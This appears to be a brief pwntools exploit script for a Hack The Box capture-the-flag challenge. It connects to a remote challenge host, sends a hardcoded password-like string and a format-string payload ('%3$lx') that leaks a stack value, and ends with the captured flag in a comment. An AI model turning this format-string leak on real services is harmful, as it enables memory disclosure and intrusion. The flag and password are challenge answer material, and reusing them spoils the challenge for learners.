from pwn import * 

payload = b'0nlyTh30r1g1n4lCr3wM3mb3r5C4nP455'
ala_canary = 0xdead1337
p = remote('206.189.126.144', 30898)
p.recvuntil(b'>')
p.sendline(b'2')
p.recvuntil(b':')
p.sendline(b'%3$lx')
print(p.recvall().decode())



#HTB{th3_g4t35_4r3_0p3n!}